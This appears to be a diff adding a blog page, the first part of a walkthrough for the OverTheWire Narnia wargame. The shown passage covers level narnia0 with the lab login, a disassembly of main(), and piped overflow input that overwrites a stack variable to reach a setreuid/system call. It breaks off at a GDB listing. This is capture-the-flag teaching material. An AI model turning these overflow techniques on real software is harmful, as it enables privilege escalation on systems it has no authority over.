@@ -1,0 +1,1051 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Narnia Challenges (part 1) - noopz</title><meta name="Description" content="The first in a multi-part walkthrough for the OverTheWire narnia levels. These levels focus on classic exploitation techniques of binaries, e.g.: bufferoverflows, smashing the stack, etc."><meta property="og:title" content="Narnia Challenges (part 1)" />
+<meta property="og:description" content="The first in a multi-part walkthrough for the OverTheWire narnia levels. These levels focus on classic exploitation techniques of binaries, e.g.: bufferoverflows, smashing the stack, etc." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://noopz.github.io/narnia_challenges_part1/" />
+<meta property="og:image" content="https://noopz.github.io/logo.png"/>
+<meta property="article:published_time" content="2020-06-27T08:26:53+00:00" />
+<meta property="article:modified_time" content="2020-06-27T08:26:53+00:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://noopz.github.io/logo.png"/>
+
+<meta name="twitter:title" content="Narnia Challenges (part 1)"/>
+<meta name="twitter:description" content="The first in a multi-part walkthrough for the OverTheWire narnia levels. These levels focus on classic exploitation techniques of binaries, e.g.: bufferoverflows, smashing the stack, etc."/>
+<meta name="application-name" content="noopz">
+<meta name="apple-mobile-web-app-title" content="noopz"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://noopz.github.io/narnia_challenges_part1/" /><link rel="prev" href="https://noopz.github.io/natas_challenges_part4/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.c1380f5e1f7f3d04b48edd22c364da70ed19205a2e23d815183d44b0e70eb6d93101e95794b3b2e22eb84c60c2e534577b1a114426b13da4030d8d61beeb974b.css" integrity="sha512-wTgPXh9/PQS0jt0iw2TacO0ZIFouI9gVGD1EsOcOttkxAelXlLOy4i64TGDC5TRXexoRRCaxPaQDDY1hvuuXSw=="><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><meta name="google-site-verification" content="qVeOJnUgOGM26P4YnScH1UZEDcMKWknHB7GATR21Ji0" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Narnia Challenges (part 1)",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/noopz.github.io\/narnia_challenges_part1\/"
+        },"image": ["https:\/\/noopz.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "OTW, narnia, wargames","wordcount":  3566 ,
+        "url": "https:\/\/noopz.github.io\/narnia_challenges_part1\/","datePublished": "2020-06-27T08:26:53+00:00","dateModified": "2020-06-27T08:26:53+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "noopz","logo": "https:\/\/noopz.github.io\/images\/avatar.jpg"},"author": {
+                "@type": "Person",
+                "name": "Zack"
+            },"description": "The first in a multi-part walkthrough for the OverTheWire narnia levels. These levels focus on classic exploitation techniques of binaries, e.g.: bufferoverflows, smashing the stack, etc."
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="noopz"><span class="header-title-pre"><i class='fas fa-hat-wizard fa-fw'></i></span>noopz</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="https://github.com/noopz/" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="noopz"><span class="header-title-pre"><i class='fas fa-hat-wizard fa-fw'></i></span>noopz</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="https://github.com/noopz/" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Narnia Challenges (part 1)</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Zack</a></span>&nbsp;<span class="post-category">included in <a href="/categories/otw/"><i class="far fa-folder fa-fw"></i>OTW</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-06-27">2020-06-27</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;3566 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;17 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#narnia0">narnia0</a></li>
+    <li><a href="#narnia1">narnia1</a></li>
+    <li><a href="#narnia2">narnia2</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>The Narnia challenges focus on various overflow techniques in order to get the exploitable program to execute arbitrary code. All of the challenges here provide both the binary to exploit as well as the source that they were created from. One of the goals I set out when starting these challenges was also to learn a lot more about assembly and reverse engineering, therefore none of these solutions will use the actual provided source. Instead I&rsquo;ll go about these by trying to breakdown the assembly to understand what the program is doing and what can be done to exploit it.</p>
+<p>It&rsquo;s worth nothing that while I&rsquo;m doing this by hand for these walkthroughs, there are many tools out there that automate the process of reverse engineering and most support some form of <a href="https://en.wikipedia.org/wiki/Decompiler" target="_blank" rel="noopener noreffer">decompilation</a>.</p>
+<p>Some of the more popular Reverse Engineering tools:</p>
+<ul>
+<li><a href="https://ghidra-sre.org/" target="_blank" rel="noopener noreffer">Ghidra</a> - Free</li>
+<li><a href="https://binary.ninja/" target="_blank" rel="noopener noreffer">Binary Ninja</a> - Various pricing</li>
+<li><a href="https://github.com/radareorg/radare2" target="_blank" rel="noopener noreffer">radare2</a> - Free
+<ul>
+<li><a href="https://github.com/radareorg/cutter" target="_blank" rel="noopener noreffer">cutter</a> - A GUI for <code>radare2</code>, also free</li>
+</ul>
+</li>
+<li><a href="https://www.hex-rays.com/products/ida/" target="_blank" rel="noopener noreffer">IDA Pro</a> - Various pricing</li>
+</ul>
+<p>All of the narnia challenges from OverTheWire can be found: <a href="https://overthewire.org/wargames/narnia/">https://overthewire.org/wargames/narnia/</a></p>
+<p>For some background on <a href="https://en.wikipedia.org/wiki/Buffer_overflow" target="_blank" rel="noopener noreffer">buffer overflows</a>, the Wiki page provides a pretty good summary of the different flavors. Additionally these walkthroughs are not meant to teach assembly programming, there are far better resources for that, like: <a href="https://en.wikibooks.org/wiki/X86_Assembly">https://en.wikibooks.org/wiki/X86_Assembly</a>. Lastly, all of the Narnia challenges are meant as a beginning set of challenges where many of the modern security techniques, like <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" target="_blank" rel="noopener noreffer">Address Space Layout Randomization</a>, are all disabled. Disabling these security techniques allow for focusing on understanding the fundamentals and build up a solid foundation.</p>
+<h2 id="narnia0">narnia0</h2>
+<p>How to log into Narnia:</p>
+<blockquote>
+<p>ssh -p 2226 <a href="mailto:narnia0@narnia.labs.overthewire.org">narnia0@narnia.labs.overthewire.org</a></p>
+</blockquote>
+<p>Password: <code>narnia0</code></p>
+<p>Where to find all of the challenges:</p>
+<blockquote>
+<p>cd /narnia/</p>
+</blockquote>
+<p>One of the very first things to do when approaching these challenges is to just try running the program to see what it&rsquo;s expecting as input and what it outputs:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">narnia0@narnia:/narnia$ ./narnia0
+
+Correct val<span class="err">&#39;</span>s value from 0x41414141 -&gt; 0xdeadbeef!
+Here is your chance: <span class="m">1234</span>
+buf: <span class="m">1234</span>
+val: 0x41414141
+WAY OFF!!!!
+</code></pre></td></tr></table>
+</div>
+</div><p>Knowing that these challenges center around overflow techniques one of the first things to attempt is providing invalid or excessive long input to cause the program to behave in an unintended way. In this case trying out, <code>AAAAABBBBBCCCCCDDDDDBBBB</code>, gives the following output:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">narnia0@narnia:/narnia$ ./narnia0
+Correct val<span class="err">&#39;</span>s value from 0x41414141 -&gt; 0xdeadbeef!
+Here is your chance: AAAAABBBBBCCCCCDDDDDBBBB
+buf: AAAAABBBBBCCCCCDDDDDBBBB
+val: 0x42424242
+WAY OFF!!!!
+</code></pre></td></tr></table>
+</div>
+</div><p>Looking at the results here the current value of <code>val</code> seems to reflect the ASCII value of <code>B</code>. If that&rsquo;s the case it should mean that the program is vulnerable to an overflow that allows for arbitrary data to be put into <code>val</code>.</p>
+<p>Let&rsquo;s check <a href="https://en.wikipedia.org/wiki/Objdump" target="_blank" rel="noopener noreffer">objdump</a>, and look at <code>main()</code> to get understand what&rsquo;s going on in this program:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="m">0804855</span><span class="n">b</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">&gt;:</span>
+ <span class="m">804855</span><span class="n">b</span><span class="o">:</span> <span class="m">55</span>                   <span class="n">push</span>   <span class="o">%ebp
+</span><span class="o"> 804855c: 89 e5                mov    %</span><span class="n">esp</span><span class="p">,</span><span class="o">%ebp
+</span><span class="o"> 804855e: 53                   push   %</span><span class="n">ebx</span>
+ <span class="m">804855</span><span class="n">f</span><span class="o">:</span> <span class="m">83</span> <span class="n">ec</span> <span class="m">18</span>             <span class="n">sub</span>    <span class="o">$</span><span class="mh">0x18</span><span class="p">,</span><span class="o">%esp
+</span><span class="o"> 8048562: c7 45 f8 41 41 41 41 movl   $0x41414141,-0x8(%</span><span class="n">ebp</span><span class="p">)</span>
+ <span class="m">8048569</span><span class="o">:</span> <span class="m">68</span> <span class="m">90</span> <span class="m">86</span> <span class="m">04</span> <span class="m">08</span>       <span class="n">push</span>   <span class="o">$</span><span class="mh">0x8048690</span>
+ <span class="m">804856</span><span class="n">e</span><span class="o">:</span> <span class="n">e8</span> <span class="m">7</span><span class="n">d</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">80483</span><span class="n">f0</span> <span class="o">&lt;</span><span class="n">puts</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+ <span class="m">8048573</span><span class="o">:</span> <span class="m">83</span> <span class="n">c4</span> <span class="m">04</span>             <span class="n">add</span>    <span class="o">$</span><span class="mh">0x4</span><span class="p">,</span><span class="o">%esp
+</span><span class="o"> 8048576: 68 c3 86 04 08       push   $0x80486c3
+</span><span class="o"> 804857b: e8 50 fe ff ff       call   80483d0 &lt;printf@plt&gt;
+</span><span class="o"> 8048580: 83 c4 04             add    $0x4,%</span><span class="n">esp</span>
+ <span class="m">8048583</span><span class="o">:</span> <span class="m">8</span><span class="n">d</span> <span class="m">45</span> <span class="n">e4</span>             <span class="n">lea</span>    <span class="m">-0</span><span class="nf">x1c</span><span class="p">(</span><span class="o">%ebp),%</span><span class="n">eax</span>
+ <span class="m">8048586</span><span class="o">:</span> <span class="m">50</span>                   <span class="n">push</span>   <span class="o">%eax
+</span><span class="o"> 8048587: 68 d9 86 04 08       push   $0x80486d9
+</span><span class="o"> 804858c: e8 af fe ff ff       call   8048440 &lt;__isoc99_scanf@plt&gt;
+</span><span class="o"> 8048591: 83 c4 08             add    $0x8,%</span><span class="n">esp</span>
+ <span class="m">8048594</span><span class="o">:</span> <span class="m">8</span><span class="n">d</span> <span class="m">45</span> <span class="n">e4</span>             <span class="n">lea</span>    <span class="m">-0</span><span class="nf">x1c</span><span class="p">(</span><span class="o">%ebp),%</span><span class="n">eax</span>
+ <span class="m">8048597</span><span class="o">:</span> <span class="m">50</span>                   <span class="n">push</span>   <span class="o">%eax
+</span><span class="o"> 8048598: 68 de 86 04 08       push   $0x80486de
+</span><span class="o"> 804859d: e8 2e fe ff ff       call   80483d0 &lt;printf@plt&gt;
+</span><span class="o"> 80485a2: 83 c4 08             add    $0x8,%</span><span class="n">esp</span>
+ <span class="m">80485</span><span class="n">a5</span><span class="o">:</span> <span class="n">ff</span> <span class="m">75</span> <span class="n">f8</span>             <span class="n">pushl</span>  <span class="m">-0</span><span class="nf">x8</span><span class="p">(</span><span class="o">%ebp)
+</span><span class="o"> 80485a8: 68 e7 86 04 08       push   $0x80486e7
+</span><span class="o"> 80485ad: e8 1e fe ff ff       call   80483d0 &lt;printf@plt&gt;
+</span><span class="o"> 80485b2: 83 c4 08             add    $0x8,%</span><span class="n">esp</span>
+ <span class="m">80485</span><span class="n">b5</span><span class="o">:</span> <span class="m">81</span> <span class="m">7</span><span class="n">d</span> <span class="n">f8</span> <span class="n">ef</span> <span class="n">be</span> <span class="n">ad</span> <span class="n">de</span> <span class="n">cmpl</span>   <span class="o">$</span><span class="mh">0xdeadbeef</span><span class="p">,</span><span class="m">-0</span><span class="nf">x8</span><span class="p">(</span><span class="o">%ebp)
+</span><span class="o"> 80485bc: 75 25                jne    80485e3 &lt;main+0x88&gt;
+</span><span class="o"> 80485be: e8 1d fe ff ff       call   80483e0 &lt;geteuid@plt&gt;
+</span><span class="o"> 80485c3: 89 c3                mov    %</span><span class="n">eax</span><span class="p">,</span><span class="o">%ebx
+</span><span class="o"> 80485c5: e8 16 fe ff ff       call   80483e0 &lt;geteuid@plt&gt;
+</span><span class="o"> 80485ca: 53                   push   %</span><span class="n">ebx</span>
+ <span class="m">80485</span><span class="n">cb</span><span class="o">:</span> <span class="m">50</span>                   <span class="n">push</span>   <span class="o">%eax
+</span><span class="o"> 80485cc: e8 4f fe ff ff       call   8048420 &lt;setreuid@plt&gt;
+</span><span class="o"> 80485d1: 83 c4 08             add    $0x8,%</span><span class="n">esp</span>
+ <span class="m">80485</span><span class="n">d4</span><span class="o">:</span> <span class="m">68</span> <span class="n">f4</span> <span class="m">86</span> <span class="m">04</span> <span class="m">08</span>       <span class="n">push</span>   <span class="o">$</span><span class="mh">0x80486f4</span>
+ <span class="m">80485</span><span class="n">d9</span><span class="o">:</span> <span class="n">e8</span> <span class="m">22</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">8048400</span> <span class="o">&lt;</span><span class="n">system</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+ <span class="m">80485</span><span class="n">de</span><span class="o">:</span> <span class="m">83</span> <span class="n">c4</span> <span class="m">04</span>             <span class="n">add</span>    <span class="o">$</span><span class="mh">0x4</span><span class="p">,</span><span class="o">%esp
+</span><span class="o"> 80485e1: eb 14                jmp    80485f7 &lt;main+0x9c&gt;
+</span><span class="o"> 80485e3: 68 fc 86 04 08       push   $0x80486fc
+</span><span class="o"> 80485e8: e8 03 fe ff ff       call   80483f0 &lt;puts@plt&gt;
+</span><span class="o"> 80485ed: 83 c4 04             add    $0x4,%</span><span class="n">esp</span>
+ <span class="m">80485</span><span class="n">f0</span><span class="o">:</span> <span class="m">6</span><span class="n">a</span> <span class="m">01</span>                <span class="n">push</span>   <span class="o">$</span><span class="mh">0x1</span>
+ <span class="m">80485</span><span class="n">f2</span><span class="o">:</span> <span class="n">e8</span> <span class="m">19</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">8048410</span> <span class="o">&lt;</span><span class="n">exit</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+ <span class="m">80485</span><span class="n">f7</span><span class="o">:</span> <span class="n">b8</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>       <span class="n">mov</span>    <span class="o">$</span><span class="mh">0x0</span><span class="p">,</span><span class="o">%eax
+</span><span class="o"> 80485fc: 8b 5d fc             mov    -0x4(%</span><span class="n">ebp</span><span class="p">),</span>%<span class="n">ebx</span>
+ <span class="m">80485</span><span class="n">ff</span><span class="o">:</span> <span class="n">c9</span>                   <span class="n">leave</span>  
+ <span class="m">8048600</span><span class="o">:</span> <span class="n">c3</span>                   <span class="n">ret</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>From this dump we can see that the stack is sized <code>24 bytes</code> (0x18):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="m">804855</span><span class="n">f</span><span class="o">:</span> <span class="m">83</span> <span class="n">ec</span> <span class="m">18</span>             <span class="n">sub</span>    <span class="o">$</span><span class="mh">0x18</span><span class="p">,</span>%<span class="n">esp</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Additionally, we can see the initial value of <code>val</code> being set on the next line, which is ultimately our target for our bufferoverflow:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="m">8048562</span><span class="o">:</span> <span class="n">c7</span> <span class="m">45</span> <span class="n">f8</span> <span class="m">41</span> <span class="m">41</span> <span class="m">41</span> <span class="m">41</span> <span class="n">movl</span>   <span class="o">$</span><span class="mh">0x41414141</span><span class="p">,</span><span class="m">-0</span><span class="nf">x8</span><span class="p">(</span>%<span class="n">ebp</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Next is the prints for the various messages, followed by a <a href="https://en.wikipedia.org/wiki/System_call" target="_blank" rel="noopener noreffer">syscall</a> to <a href="http://www.cplusplus.com/reference/cstdio/scanf/" target="_blank" rel="noopener noreffer">scanf</a>. These two lines should be where we load the address of our buffer for <code>scanf</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"> <span class="m">8048583</span><span class="o">:</span> <span class="m">8</span><span class="n">d</span> <span class="m">45</span> <span class="n">e4</span>             <span class="n">lea</span>    <span class="m">-0</span><span class="nf">x1c</span><span class="p">(</span><span class="o">%ebp),%</span><span class="n">eax</span>
+ <span class="m">8048586</span><span class="o">:</span> <span class="m">50</span>                   <span class="n">push</span>   %<span class="n">eax</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>And this should be the formatted string, which is stored in the binary itself:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"> <span class="m">8048587</span><span class="o">:</span> <span class="m">68</span> <span class="n">d9</span> <span class="m">86</span> <span class="m">04</span> <span class="m">08</span>       <span class="n">push</span>   <span class="o">$</span><span class="mh">0x80486d9</span>
+ <span class="m">804858</span><span class="n">c</span><span class="o">:</span> <span class="n">e8</span> <span class="n">af</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">8048440</span> <span class="o">&lt;</span><span class="n">__isoc99_scanf</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Followed by some more prints, and finally the good stuff, where the comparison is done with <code>val</code> and the hardcoded value <code>0xdeadbeef</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"> <span class="m">80485</span><span class="n">b5</span><span class="o">:</span> <span class="m">81</span> <span class="m">7</span><span class="n">d</span> <span class="n">f8</span> <span class="n">ef</span> <span class="n">be</span> <span class="n">ad</span> <span class="n">de</span> <span class="n">cmpl</span>   <span class="o">$</span><span class="mh">0xdeadbeef</span><span class="p">,</span><span class="m">-0</span><span class="nf">x8</span><span class="p">(</span>%<span class="n">ebp</span><span class="p">)</span>
+ <span class="m">80485</span><span class="n">bc</span><span class="o">:</span> <span class="m">75</span> <span class="m">25</span>                <span class="n">jne</span>    <span class="m">80485e3</span> <span class="o">&lt;</span><span class="n">main</span><span class="m">+0</span><span class="n">x88</span><span class="o">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>It also looks like when the comparison succeeds a privileged function will be called, specifically the <a href="https://www.man7.org/linux/man-pages/man2/setreuid.2.html" target="_blank" rel="noopener noreffer">setreuid</a> so elevate privileges, and then a call to <a href="https://www.man7.org/linux/man-pages/man3/system.3.html" target="_blank" rel="noopener noreffer">system</a>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"> <span class="m">80485</span><span class="n">be</span><span class="o">:</span> <span class="n">e8</span> <span class="m">1</span><span class="n">d</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">80483e0</span> <span class="o">&lt;</span><span class="n">geteuid</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+ <span class="m">80485</span><span class="n">c3</span><span class="o">:</span> <span class="m">89</span> <span class="n">c3</span>                <span class="n">mov</span>    <span class="o">%eax,%</span><span class="n">ebx</span>
+ <span class="m">80485</span><span class="n">c5</span><span class="o">:</span> <span class="n">e8</span> <span class="m">16</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">80483e0</span> <span class="o">&lt;</span><span class="n">geteuid</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+ <span class="m">80485</span><span class="n">ca</span><span class="o">:</span> <span class="m">53</span>                   <span class="n">push</span>   <span class="o">%ebx
+</span><span class="o"> 80485cb: 50                   push   %</span><span class="n">eax</span>
+ <span class="m">80485</span><span class="n">cc</span><span class="o">:</span> <span class="n">e8</span> <span class="m">4</span><span class="n">f</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">8048420</span> <span class="o">&lt;</span><span class="n">setreuid</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+ <span class="m">80485</span><span class="n">d1</span><span class="o">:</span> <span class="m">83</span> <span class="n">c4</span> <span class="m">08</span>             <span class="n">add</span>    <span class="o">$</span><span class="mh">0x8</span><span class="p">,</span>%<span class="n">esp</span>
+ <span class="m">80485</span><span class="n">d4</span><span class="o">:</span> <span class="m">68</span> <span class="n">f4</span> <span class="m">86</span> <span class="m">04</span> <span class="m">08</span>       <span class="n">push</span>   <span class="o">$</span><span class="mh">0x80486f4</span>
+ <span class="m">80485</span><span class="n">d9</span><span class="o">:</span> <span class="n">e8</span> <span class="m">22</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">8048400</span> <span class="o">&lt;</span><span class="n">system</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Providing input to an application&rsquo;s stdin can be accomplished via a <a href="https://en.wikipedia.org/wiki/Pipeline_%28Unix%29" target="_blank" rel="noopener noreffer">pipe</a>, <code>|</code>. Allowing for executing some previous command, using it&rsquo;s output to <code>stdout</code> and <code>pipe</code>-ing that into the <code>stdin</code> of the next program:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">narnia0@narnia:/narnia$ python -c <span class="s1">&#39;print &#34;B&#34; * 24&#39;</span> <span class="p">|</span> ./narnia0
+Correct val<span class="err">&#39;</span>s value from 0x41414141 -&gt; 0xdeadbeef!
+Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBBBBB
+val: 0x42424242
+WAY OFF!!!!
+</code></pre></td></tr></table>
+</div>
+</div><p>At this point it&rsquo;s clear all that needs to be done is to <code>pipe</code> in some input with some number of <code>A</code>s followed by <code>0xdeadbeef</code>. However before doing that, running this through <a href="https://en.wikipedia.org/wiki/GNU_Debugger" target="_blank" rel="noopener noreffer">GDB</a> can provide some more insight and be a good place to get some experience stepping through a program with only assembly code available:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
